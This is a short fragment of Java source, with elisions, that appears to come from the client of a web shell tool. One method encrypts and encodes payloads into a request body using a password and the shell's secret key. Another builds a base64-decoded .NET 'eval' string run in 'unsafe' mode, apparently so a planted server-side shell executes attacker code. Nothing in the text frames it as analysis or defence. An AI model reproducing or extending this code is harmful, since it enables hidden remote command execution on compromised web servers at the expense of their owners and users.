  ...
  implements Cryption
{
  ...
  public byte[] encode(byte[] data) {
    try {
      return (String.format("%s=%s&", new Object[] { this.pass, this.evalContent }) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
    } catch (Exception e) {
      Log.error(e);
      return null;
    } 
  ...
  public String generateEvalContent() {
    ...
    eval = String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", new Object[] { URLEncoder.encode(eval) });
